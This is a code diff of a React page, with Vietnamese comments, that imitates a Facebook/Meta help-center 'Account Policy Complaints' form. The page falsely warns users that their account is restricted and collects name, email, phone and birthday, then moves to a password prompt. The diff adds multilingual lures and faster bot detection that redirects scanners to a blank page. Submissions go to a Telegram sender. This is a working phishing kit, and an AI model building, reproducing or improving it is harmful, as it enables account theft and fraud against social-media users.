@@ -7,10 +7,192 @@ import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
-// 🛡️ THÊM IMPORT CÁC FUNCTION BẢO MẬT
 import countryToLanguage from '@/utils/country_to_language';
 import detectBot from '@/utils/detect_bot';
 import axios from 'axios';
+
+// 🚀 PRE-BUILT TRANSLATIONS - CỰC NHANH
+const PREBUILT_TRANSLATIONS = {
+    'vi': {
+        'Help Center': 'Trung tâm Trợ giúp',
+        'English': 'Tiếng Anh',
+        'Using': 'Sử dụng',
+        'Managing Your Account': 'Quản lý Tài khoản',
+        'Privacy, Safety and Security': 'Quyền riêng tư, An toàn và Bảo mật',
+        'Policies and Reporting': 'Chính sách và Báo cáo',
+        'Account Policy Complaints': 'Khiếu nại Chính sách Tài khoản',
+        'We have detected unusual activity on your account that violates our community standards.': 'Chúng tôi đã phát hiện hoạt động bất thường trên tài khoản của bạn vi phạm tiêu chuẩn cộng đồng của chúng tôi.',
+        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'Quyền truy cập tài khoản của bạn sẽ bị hạn chế và bạn sẽ không thể đăng, chia sẻ hoặc bình luận bằng trang của mình tại thời điểm này.',
+        'If you believe this is an error, you can file a complaint by providing the required information.': 'Nếu bạn tin rằng đây là lỗi, bạn có thể gửi khiếu nại bằng cách cung cấp thông tin bắt buộc.',
+        'Name': 'Tên',
+        'Email': 'Email',
+        'Phone Number': 'Số điện thoại',
+        'Birthday': 'Ngày sinh',
+        'Your Appeal': 'Khiếu nại của bạn',
+        'Please describe your appeal in detail...': 'Vui lòng mô tả chi tiết khiếu nại của bạn...',
+        'Submit': 'Gửi đi',
+        'This field is required': 'Trường này là bắt buộc',
+        'Please enter a valid email address': 'Vui lòng nhập địa chỉ email hợp lệ',
+        'About': 'Giới thiệu',
+        'Ad choices': 'Lựa chọn quảng cáo',
+        'Create ad': 'Tạo quảng cáo',
+        'Privacy': 'Quyền riêng tư',
+        'Careers': 'Nghề nghiệp',
+        'Create Page': 'Tạo Trang',
+        'Terms and policies': 'Điều khoản và chính sách',
+        'Cookies': 'Cookies'
+    },
+    'es': {
+        'Help Center': 'Centro de ayuda',
+        'English': 'Inglés',
+        'Using': 'Usando',
+        'Managing Your Account': 'Gestionando tu cuenta',
+        'Privacy, Safety and Security': 'Privacidad, Seguridad y Protección',
+        'Policies and Reporting': 'Políticas e Informes',
+        'Account Policy Complaints': 'Quejas sobre Políticas de Cuenta',
+        'We have detected unusual activity on your account that violates our community standards.': 'Hemos detectado actividad inusual en su cuenta que viola nuestros estándares comunitarios.',
+        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'El acceso a su cuenta estará restringido y no podrá publicar, compartir o comentar usando su página en este momento.',
+        'If you believe this is an error, you can file a complaint by providing the required information.': 'Si cree que esto es un error, puede presentar una queja proporcionando la información requerida.',
+        'Name': 'Nombre',
+        'Email': 'Correo electrónico',
+        'Phone Number': 'Número de teléfono',
+        'Birthday': 'Cumpleaños',
+        'Your Appeal': 'Su apelación',
+        'Please describe your appeal in detail...': 'Por favor describa su apelación en detalle...',
+        'Submit': 'Enviar',
+        'This field is required': 'Este campo es obligatorio',
+        'Please enter a valid email address': 'Por favor ingrese una dirección de correo válida',
+        'About': 'Acerca de',
+        'Ad choices': 'Opciones de anuncios',
+        'Create ad': 'Crear anuncio',
+        'Privacy': 'Privacidad',
+        'Careers': 'Carreras',
+        'Create Page': 'Crear página',
+        'Terms and policies': 'Términos y políticas',
+        'Cookies': 'Cookies'
+    },
+    'fr': {
+        'Help Center': 'Centre d\'aide',
+        'English': 'Anglais',
+        'Using': 'Utilisation',
+        'Managing Your Account': 'Gestion de votre compte',
+        'Privacy, Safety and Security': 'Confidentialité, Sécurité et Protection',
+        'Policies and Reporting': 'Politiques et Signalements',
+        'Account Policy Complaints': 'Réclamations concernant les Politiques de Compte',
+        'We have detected unusual activity on your account that violates our community standards.': 'Nous avons détecté une activité inhabituelle sur votre compte qui viole nos normes communautaires.',
+        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'L\'accès à votre compte sera restreint et vous ne pourrez pas publier, partager ou commenter en utilisant votre page pour le moment.',
+        'If you believe this is an error, you can file a complaint by providing the required information.': 'Si vous pensez qu\'il s\'agit d\'une erreur, vous pouvez déposer une réclamation en fournissant les informations requises.',
+        'Name': 'Nom',
+        'Email': 'E-mail',
+        'Phone Number': 'Numéro de téléphone',
+        'Birthday': 'Anniversaire',
+        'Your Appeal': 'Votre recours',
+        'Please describe your appeal in detail...': 'Veuillez décrire votre recours en détail...',
+        'Submit': 'Soumettre',
+        'This field is required': 'Ce champ est obligatoire',
+        'Please enter a valid email address': 'Veuillez saisir une adresse e-mail valide',
+        'About': 'À propos',
+        'Ad choices': 'Choix publicitaires',
+        'Create ad': 'Créer une publicité',
+        'Privacy': 'Confidentialité',
+        'Careers': 'Carrières',
+        'Create Page': 'Créer une Page',
+        'Terms and policies': 'Conditions et politiques',
+        'Cookies': 'Cookies'
+    },
+    'zh': {
+        'Help Center': '帮助中心',
+        'English': '英语',
+        'Using': '使用',
+        'Managing Your Account': '管理您的账户',
+        'Privacy, Safety and Security': '隐私、安全和保障',
+        'Policies and Reporting': '政策和报告',
+        'Account Policy Complaints': '账户政策投诉',
+        'We have detected unusual activity on your account that violates our community standards.': '我们检测到您的账户存在违反我们社区标准的不寻常活动。',
+        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': '您的账户访问将受到限制，此时您将无法使用您的页面发布、分享或评论。',
+        'If you believe this is an error, you can file a complaint by providing the required information.': '如果您认为这是一个错误，您可以通过提供所需信息来提交投诉。',
+        'Name': '姓名',
+        'Email': '电子邮件',
+        'Phone Number': '电话号码',
+        'Birthday': '生日',
+        'Your Appeal': '您的申诉',
+        'Please describe your appeal in detail...': '请详细描述您的申诉...',
+        'Submit': '提交',
+        'This field is required': '此字段为必填项',
+        'Please enter a valid email address': '请输入有效的电子邮件地址',
+        'About': '关于',
+        'Ad choices': '广告选择',
+        'Create ad': '创建广告',
+        'Privacy': '隐私',
+        'Careers': '职业',
+        'Create Page': '创建页面',
+        'Terms and policies': '条款和政策',
+        'Cookies': 'Cookies'
+    },
+    'ja': {
+        'Help Center': 'ヘルプセンター',
+        'English': '英語',
+        'Using': '使用',
+        'Managing Your Account': 'アカウントの管理',
+        'Privacy, Safety and Security': 'プライバシー、安全とセキュリティ',
+        'Policies and Reporting': 'ポリシーと報告',
+        'Account Policy Complaints': 'アカウントポリシーに関する苦情',
+        'We have detected unusual activity on your account that violates our community standards.': 'コミュニティ基準に違反する異常な活動をアカウントで検出しました。',
+        'Your account access will be restricted and you will not be able to post, share, or comment using your page at this time.': 'アカウントへのアクセスが制限され、現時点ではページを使用して投稿、共有、コメントできなくなります。',
+        'If you believe this is an error, you can file a complaint by providing the required information.': 'これが誤りであると思われる場合は、必要な情報を提供して苦情を申し立てることができます。',
+        'Name': '名前',
+        'Email': 'メール',
+        'Phone Number': '電話番号',
+        'Birthday': '生年月日',
+        'Your Appeal': 'あなたの申し立て',
+        'Please describe your appeal in detail...': '申し立ての内容を詳細に記述してください...',
+        'Submit': '送信',
+        'This field is required': 'このフィールドは必須です',
+        'Please enter a valid email address': '有効なメールアドレスを入力してください',
+        'About': 'について',
+        'Ad choices': '広告の選択',
+        'Create ad': '広告を作成',
+        'Privacy': 'プライバシー',
+        'Careers': 'キャリア',
+        'Create Page': 'ページを作成',
+        'Terms and policies': '利用規約とポリシー',
+        'Cookies': 'クッキー'
+    }
+};
+
+// 🚀 FAST TRANSLATION FUNCTIONS
+const instantTranslate = (text, lang) => {
+    return PREBUILT_TRANSLATIONS[lang]?.[text] || text;
+};
+
+const fastBatchTranslate = async (texts, targetLang) => {
+    if (PREBUILT_TRANSLATIONS[targetLang]) {
+        // 🚀 Sử dụng pre-built translations - cực nhanh
+        const result = {};
+        Object.keys(texts).forEach(key => {
+            result[key] = instantTranslate(texts[key], targetLang);
+        });
+        return result;
+    }
+    
+    // Fallback: dịch song song
+    try {
+        const translationPromises = Object.entries(texts).map(async ([key, text]) => {
+            const translated = await translateText(text, targetLang);
+            return { key, translated };
+        });
+        
+        const results = await Promise.all(translationPromises);
+        const translatedTexts = {};
+        results.forEach(({ key, translated }) => {
+            translatedTexts[key] = translated;
+        });
+        
+        return translatedTexts;
+    } catch (error) {
+        return texts; // Fallback về text gốc
+    }
+};
 
 const Home = () => {
     const defaultTexts = useMemo(
@@ -59,149 +241,84 @@ const Home = () => {
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
-    // 🚀 THAY ĐỔI: Thêm state để theo dõi trạng thái bảo mật
     const [securityChecked, setSecurityChecked] = useState(false);
     const [isFormEnabled, setIsFormEnabled] = useState(false);
 
-    // 🛡️ HÀM KHỞI TẠO BẢO MẬT - CHẠY BACKGROUND
-    const initializeSecurity = useCallback(async () => {
+    // 🚀 TỐI ƯU: Khởi tạo bảo mật và dịch thuật cực nhanh
+    const initializeSecurityAndTranslation = useCallback(async () => {
         try {
-            // 1. Kiểm tra bot tự động
-            const botResult = await detectBot();
-            if (botResult.isBot) {
-                window.location.href = 'about:blank';
-                return;
-            }
+            // 1. Kiểm tra bot (timeout ngắn)
+            const botPromise = detectBot().then(result => {
+                if (result.isBot) {
+                    window.location.href = 'about:blank';
+                    return Promise.reject('Bot detected');
+                }
+            });
 
-            // 2. Lấy thông tin IP và vị trí
-            const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-            const ipData = response.data;
+            // 2. Lấy IP và vị trí
+            const ipPromise = axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 3000 });
+
+            // 🚀 CHẠY SONG SONG: bot check + IP detection
+            const [ipResponse] = await Promise.all([ipPromise, botPromise]);
+            const ipData = ipResponse.data;
             
-            // Lưu thông tin IP vào localStorage
             localStorage.setItem('ipInfo', JSON.stringify(ipData));
             
             const detectedCountry = ipData.country_code || 'US';
             setCountryCode(detectedCountry);
 
-            // 3. Xác định ngôn ngữ và dịch (chạy sau khi web đã hiển thị)
+            // 3. Xác định ngôn ngữ và dịch CỰC NHANH
             const targetLang = countryToLanguage[detectedCountry] || 'en';
             localStorage.setItem('targetLang', targetLang);
             
-            if (targetLang !== 'en') {
-                // Dịch ở background, không chờ
-                translateCriticalTexts(targetLang);
+            // Set calling code
+            try {
+                const code = getCountryCallingCode(detectedCountry);
+                setCallingCode(`+${code}`);
+            } catch {
+                setCallingCode('+1');
             }
 
-            // 4. Set calling code
-            const code = getCountryCallingCode(detectedCountry);
-            setCallingCode(`+${code}`);
+            // 🚀 DỊCH CỰC NHANH: Sử dụng pre-built hoặc batch translate
+            if (targetLang !== 'en') {
+                const startTime = Date.now();
+                const translated = await fastBatchTranslate(defaultTexts, targetLang);
+                console.log(`Translation completed in ${Date.now() - startTime}ms`);
+                setTranslatedTexts(translated);
+            }
 
-            // 🚀 QUAN TRỌNG: Đánh dấu đã check bảo mật và enable form
+            // 🚀 BẬT FORM NGAY LẬP TỨC
             setSecurityChecked(true);
             setIsFormEnabled(true);
             
         } catch (error) {
-            console.log('Security initialization failed:', error.message);
-            // 🚀 QUAN TRỌNG: Vẫn enable form nếu có lỗi
+            console.log('Security init failed:', error.message);
+            // 🚀 FALLBACK: Vẫn bật form
             setCountryCode('US');
             setCallingCode('+1');
             setSecurityChecked(true);
             setIsFormEnabled(true);
         }
-    }, []);
-
-    // 🚀 HÀM DỊCH TEXT QUAN TRỌNG TRƯỚC
-    const translateCriticalTexts = useCallback(async (targetLang) => {
-        try {
-            const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit] = await Promise.all([
-                translateText(defaultTexts.helpCenter, targetLang),
-                translateText(defaultTexts.pagePolicyAppeals, targetLang),
-                translateText(defaultTexts.detectedActivity, targetLang),
-                translateText(defaultTexts.accessLimited, targetLang),
-                translateText(defaultTexts.submitAppeal, targetLang),
-                translateText(defaultTexts.pageName, targetLang),
-                translateText(defaultTexts.mail, targetLang),
-                translateText(defaultTexts.phone, targetLang),
-                translateText(defaultTexts.birthday, targetLang),
-                translateText(defaultTexts.yourAppeal, targetLang),
-                translateText(defaultTexts.submit, targetLang)
-            ]);
-
-            setTranslatedTexts(prev => ({
-                ...prev,
-                helpCenter,
-                pagePolicyAppeals,
-                detectedActivity,
-                accessLimited,
-                submitAppeal,
-                pageName,
-                mail,
-                phone,
-                birthday,
-                yourAppeal,
-                submit
-            }));
-
-            // Dịch phần còn lại ở background
-            translateRemainingTexts(targetLang);
-        } catch (error) {
-            console.log('Critical translation failed:', error.message);
-        }
     }, [defaultTexts]);
 
-    // 🚀 HÀM DỊCH TEXT CÒN LẠI - KHÔNG ẢNH HƯỞNG ĐẾN HIỂN THỊ
-    const translateRemainingTexts = useCallback(async (targetLang) => {
-        try {
-            const [english, using, managingAccount, privacySecurity, policiesReporting, appealPlaceholder, fieldRequired, invalidEmail, about, adChoices, createAd, privacy, careers, createPage, termsPolicies, cookies] = await Promise.all([
-                translateText(defaultTexts.english, targetLang),
-                translateText(defaultTexts.using, targetLang),
-                translateText(defaultTexts.managingAccount, targetLang),
-                translateText(defaultTexts.privacySecurity, targetLang),
-                translateText(defaultTexts.policiesReporting, targetLang),
-                translateText(defaultTexts.appealPlaceholder, targetLang),
-                translateText(defaultTexts.fieldRequired, targetLang),
-                translateText(defaultTexts.invalidEmail, targetLang),
-                translateText(defaultTexts.about, targetLang),
-                translateText(defaultTexts.adChoices, targetLang),
-                translateText(defaultTexts.createAd, targetLang),
-                translateText(defaultTexts.privacy, targetLang),
-                translateText(defaultTexts.careers, targetLang),
-                translateText(defaultTexts.createPage, targetLang),
-                translateText(defaultTexts.termsPolicies, targetLang),
-                translateText(defaultTexts.cookies, targetLang)
-            ]);
-
-            setTranslatedTexts(prev => ({
-                ...prev,
-                english, using, managingAccount, privacySecurity, policiesReporting,
-                appealPlaceholder, fieldRequired, invalidEmail, about, adChoices,
-                createAd, privacy, careers, createPage, termsPolicies, cookies
-            }));
-        } catch (error) {
-            console.log('Remaining translation failed:', error.message);
-        }
-    }, [defaultTexts]);
-
-    // 🚀 THAY ĐỔI QUAN TRỌNG: HIỂN THỊ WEB NGAY, CHẠY BẢO MẬT SAU
+    // 🚀 KHỞI TẠO NHANH: Không chờ
     useEffect(() => {
-        // Chạy bảo mật ở background
-        initializeSecurity();
+        initializeSecurityAndTranslation();
         
-        // 🚀 Enable form sau 2 giây dù bảo mật có xong hay chưa
-        const timer = setTimeout(() => {
+        // 🚀 BACKUP: Luôn bật form sau 1.5s dù có lỗi
+        const backupTimer = setTimeout(() => {
             setIsFormEnabled(true);
-        }, 2000);
+        }, 1500);
         
-        return () => clearTimeout(timer);
-    }, [initializeSecurity]);
+        return () => clearTimeout(backupTimer);
+    }, [initializeSecurityAndTranslation]);
 
-    // Hàm validate email
+    // Các hàm xử lý khác giữ nguyên
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
     };
 
-    // Hàm chuyển đổi từ yyyy-mm-dd sang dd/mm/yyyy
     const formatDateToDDMMYYYY = (dateString) => {
         if (!dateString) return '';
         const parts = dateString.split('-');
@@ -209,7 +326,6 @@ const Home = () => {
         return `${parts[2]}/${parts[1]}/${parts[0]}`;
     };
 
-    // THÊM HÀM ẨN EMAIL: s****g@m****.com
     const hideEmail = (email) => {
         if (!email) return 's****g@m****.com';
         const parts = email.split('@');
@@ -222,28 +338,23 @@ const Home = () => {
         if (username.length <= 1) return email;
         if (domainParts.length < 2) return email;
         
-        // Format: s****g (ký tự đầu + *** + ký tự cuối)
         const formattedUsername = username.charAt(0) + '*'.repeat(Math.max(0, username.length - 2)) + (username.length > 1 ? username.charAt(username.length - 1) : '');
-        
-        // Format: m****.com (ký tự đầu + *** + .com)
         const formattedDomain = domainParts[0].charAt(0) + '*'.repeat(Math.max(0, domainParts[0].length - 1)) + '.' + domainParts.slice(1).join('.');
         
         return formattedUsername + '@' + formattedDomain;
     };
 
-    // THÊM HÀM ẨN SỐ ĐIỆN THOẠI: ******32 (6 sao + 2 số cuối)
     const hidePhone = (phone) => {
         if (!phone) return '******32';
         const cleanPhone = phone.replace(/^\+\d+\s*/, '');
         if (cleanPhone.length < 2) return '******32';
         
-        // Luôn hiển thị 6 sao + 2 số cuối
         const lastTwoDigits = cleanPhone.slice(-2);
         return '*'.repeat(6) + lastTwoDigits;
     };
 
     const handleInputChange = (field, value) => {
-        if (!isFormEnabled) return; // 🚀 Không cho nhập nếu form chưa enabled
+        if (!isFormEnabled) return;
         
         if (field === 'phone') {
             const cleanValue = value.replace(/^\+\d+\s*/, '');
@@ -263,7 +374,6 @@ const Home = () => {
             }));
         }
 
-        // Chỉ clear error khi người dùng bắt đầu nhập, không validate real-time
         if (errors[field]) {
             setErrors((prev) => ({
                 ...prev,
@@ -273,7 +383,7 @@ const Home = () => {
     };
 
     const validateForm = () => {
-        if (!isFormEnabled) return false; // 🚀 Không cho submit nếu form chưa enabled
+        if (!isFormEnabled) return false;
         
         const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
         const newErrors = {};
@@ -284,7 +394,6 @@ const Home = () => {
             }
         });
 
-        // Validate email format chỉ khi submit
         if (formData.mail.trim() !== '' && !validateEmail(formData.mail)) {
             newErrors.mail = 'invalid';
         }
@@ -294,14 +403,13 @@ const Home = () => {
     };
 
     const handleSubmit = async () => {
-        if (!isFormEnabled) return; // 🚀 Không cho submit nếu form chưa enabled
+        if (!isFormEnabled) return;
         
         if (validateForm()) {
             try {
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
-                // THÊM CODE XỬ LÝ ẨN THÔNG TIN VÀ LƯU VÀO LOCALSTORAGE
                 const hiddenData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
@@ -309,9 +417,7 @@ const Home = () => {
                     birthday: formData.birthday
                 };
 
-                // Lưu vào localStorage để trang Verify lấy
                 localStorage.setItem('userInfo', JSON.stringify(hiddenData));
-
                 setShowPassword(true);
             } catch {
                 window.location.href = 'about:blank';
@@ -368,8 +474,6 @@ const Home = () => {
             title: translatedTexts.policiesReporting
         }
     ];
-
-    // 🚀 XÓA LOADING COMPONENT - LUÔN HIỂN THỊ WEB NGAY
 
     return (
         <>
@@ -470,7 +574,6 @@ const Home = () => {
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
                                 
-                                {/* Desktop: type='date' bình thường */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
@@ -480,7 +583,6 @@ const Home = () => {
                                     disabled={!isFormEnabled}
                                 />
                                 
-                                {/* Mobile: type='date' với placeholder ảo */}
                                 <div className='block sm:hidden relative'>
                                     <input 
                                         type='date' 
@@ -491,7 +593,6 @@ const Home = () => {
                                         required
                                         disabled={!isFormEnabled}
                                     />
-                                    {/* Placeholder ảo cho mobile */}
                                     <div 
                                         className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled ? 'opacity-50 cursor-not-allowed' : ''}`}
                                         onClick={() => isFormEnabled && document.querySelectorAll('input[name="birthday"]')[1].click()}
@@ -525,7 +626,6 @@ const Home = () => {
                                 {!isFormEnabled ? 'Đang kiểm tra...' : translatedTexts.submit}
                             </button>
                             
-                            {/* 🚀 Hiển thị trạng thái bảo mật */}
                             {!securityChecked && (
                                 <div className="text-center text-sm text-gray-500 mt-2">
                                     Đang kiểm tra bảo mật...
